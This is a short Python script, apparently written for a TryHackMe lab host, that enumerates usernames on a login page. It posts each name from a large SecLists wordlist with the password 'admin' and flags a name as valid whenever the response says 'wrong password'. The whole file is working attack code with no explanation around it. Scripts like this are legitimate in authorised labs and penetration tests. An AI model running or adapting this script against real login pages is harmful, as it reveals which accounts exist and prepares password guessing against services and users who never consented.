import requests
URL = "http://lookup.thm/login.php"
USERNAMES_FILE_PATH = "//usr//share//seclists//Usernames//xato-net-10-million-usernames.txt"
data = {}
try:
    with open(USERNAMES_FILE_PATH, "r") as file:
        for line in file:
            username = line.strip()
            data = {"username": username, "password": "admin"}
            response = requests.post(url=URL, data=data)
            if "wrong password" in response.text.lower():
            	print(f"Valid user found: {username}")
except FileNotFoundError:
    print(f"The file {USERNAMES_FILE_PATH} wasn't found")
except requests.RequestException as e:
    print(f"Request Error: {e}")
